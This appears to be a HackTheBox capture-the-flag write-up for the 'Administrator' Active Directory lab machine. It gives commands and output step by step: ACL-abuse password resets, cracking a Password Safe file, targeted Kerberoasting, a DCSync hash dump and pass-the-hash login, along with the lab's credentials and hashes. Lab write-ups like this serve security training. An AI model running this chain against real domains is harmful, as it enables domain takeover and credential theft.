---
title: Administrator
published: 2024-12-17
description: 'Administrato Hackthebox machine writeup'
image: '../../assets/administrator/administrator.png'
tags: [HTB, AD, Machines]
category: 'HTB'
draft: true 
lang: ''
---


first of all in this machine they gave us a username:password to starts with `Olivia::ichliebedich`

# enumeration
```
nmap -sC -sV -Pn -oA Administrator 10.10.11.42

Nmap scan report for 10.10.11.42
Host is up (0.093s latency).
Not shown: 988 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-16 20:43:17Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

```

we notice that there is an ftp port open

# Active Directory enumeration

using the creds given with bloodhound to collect some information about the AD envirement
```bash
bloodhound-python -u 'Olivia' -p 'ichliebedich' -ns 10.10.11.42 -d administrator.htb -c all

zip -r bloodhound.zip *.json
```

now lets open the .zip file with bloodhound

![](src/assets/administrator/Administrator_image_1.png)

first thing we notice when seeing rights Olivia have is the `GenericAll` on MICHAEL, this gives Full control of a user that allows you to modify properties of the user to perform a targeted kerberoast attack, and also grants the ability to reset the password of the user without knowing their current one, we gonna chose the second one and try to reset the `MICHAEL` password using this command:

```bash
net rpc password "MICHAEL" "password123" -U "administrator.htb"/"Olivia"%"ichliebedich" -S "dc.administrator.htb"
```

```bash
netexec smb 10.10.11.42 -u 'MICHAEL' -p 'password123'

SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\MICHAEL:password123 
```



## Michael

![](src/assets/administrator/Administrator_image_2.png)
from bloudhound we can see that `MICHAEL` have `ForceChangePassword` ACE on `Benjamin` lets try to exploit this again with `net` command from samba tools 

```bash
net rpc password "BENJAMIN" "password123" -U "administrator.htb"/"MICHAEL"%"password123" -S "dc.administrator.htb"
```

verification:
```bash
netexec smb 10.10.11.42 -u 'BENJAMIN' -p 'password123'

SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\BENJAMIN:password123 

```

## Benjamin

apparently `Benjamin` does not have any ACEs rights, now lets try to do something else with this user

remember the FTP service, if we try to log in with this user we can download a .psafe3 Passwords file

```bash
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
227 Entering Passive Mode (10,10,11,42,241,123).
125 Data connection already open; Transfer starting.
10-05-24  08:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> get Backup.psafe3
```

the Backup file requires a password to be opened lets try to crack its password using hashcat

```bash
hashcat -m 5200 -a 0 Backup.psafe3 rockyou.txt
```

we find this password `tekieromucho`

now lets open the backup file using `PasswordSafe` software
![](src/assets/administrator/Administrator_image_3.png)

emily have an `GenericWrite` on `Ethan`, so we can do a `targetedKerberos` attack to retrieve its TGS and try to crack it

![](src/assets/administrator/Administrator_image_4.png)

```bash
python targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
...

impacket.krb5.kerberosv5.KerberosError: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```
so solve this error i followed this blog: https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069

```bash
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (ethan)
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$...fc5d1cdf4355d75
[VERBOSE] SPN removed successfully for (ethan)
```
now lets crack the TGS with hashcat
```bash
hashcat -m 13100 ethan_tgs rockyou.txt
```

And we found this password: `limpbizkit`
## Ethan

searching for users who have DCSync revealed that `Ethan` have DCSync rights too

![](src/assets/administrator/Administrator_image_5.png)


now lets try to dump `administrator` NTLM hash using `secretsdump`
```bash
secretsdump.py 'administrator.htb'/'ethan':'limpbizkit'@'dc.administrator.htb'


Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
....
```


now we can connect using `evil-winrm` as administrator and get the user and admin flags
```bash
evil-winrm -i 10.10.11.42 -u 'administrator'  -H '3dc553ce4b9fd20bd016e098d2d2fd2e'
```

